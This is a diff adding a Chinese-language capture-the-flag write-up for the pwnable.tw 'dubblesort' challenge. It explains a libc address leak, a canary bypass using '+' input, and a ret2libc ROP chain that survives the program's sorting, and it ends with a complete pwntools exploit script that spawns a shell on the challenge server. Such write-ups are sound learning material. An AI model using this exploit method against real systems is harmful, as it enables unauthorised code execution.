@@ -205,3 +205,32 @@ add(8,p32(libc.sym['system'])+b";sh\x00") #1号note的header
 show(1)
 r.interactive()
 ```
+
+## dubblesort
+
+那我问你，为什么不给我dockerfile？
+
+存储name的变量事先没有清空，因此可以通过变量里遗留的内容泄漏libc地址
+
+numbers的数量没有做限制，于是有一个很明显的溢出。关键点是输入`+`跳过canary，然后写调用system的rop链。我检查过了，libc里正好`/bin/sh`的地址大于system的地址，于是不用担心排序函数打乱rop链。唯一的问题是canary的值可能大于rop链的值。遇到这种情况只能重开
+
+本地很快就通了，但是打远程时发现远程得到的地址和本地基本不一样。虽然主页有写用的是`Ubuntu 16.04/18.04`的docker image，但我实测发现地址的分布仍然不一样。假设需要泄漏的目标地址为x，无论是16.04还是18.04，x都在偏移24的地方；但远程偏移是28。而且这个地址的末尾是`\x00`，我一直拿`b'a'*(4*x-1)+b'\x0a'`去够地址，但想要泄漏这个地址必须不减那个1。又卡了我很久。唉下一次多注意吧
+```py
+from pwn import *
+libc = ELF("./libc_32.so.6")
+p=remote("chall.pwnable.tw",10101)
+payload=b'a'*(4*7)
+p.sendline(payload)
+p.recvuntil(payload)
+libc.address=u32(p.recv(4))-0x1b0000-0xa
+p.sendlineafter(":",'35')
+for i in range(24):
+    p.sendlineafter(": ",'0')
+p.sendlineafter(": ",'+')
+for i in range(7):
+    p.sendlineafter(": ",str(libc.sym['system']))
+p.sendlineafter(": ",str(libc.sym['system']))
+p.sendlineafter(": ",str(libc.sym['system']))
+p.sendlineafter(": ",str(libc.search(b'/bin/sh').__next__()))
+p.interactive()
+```
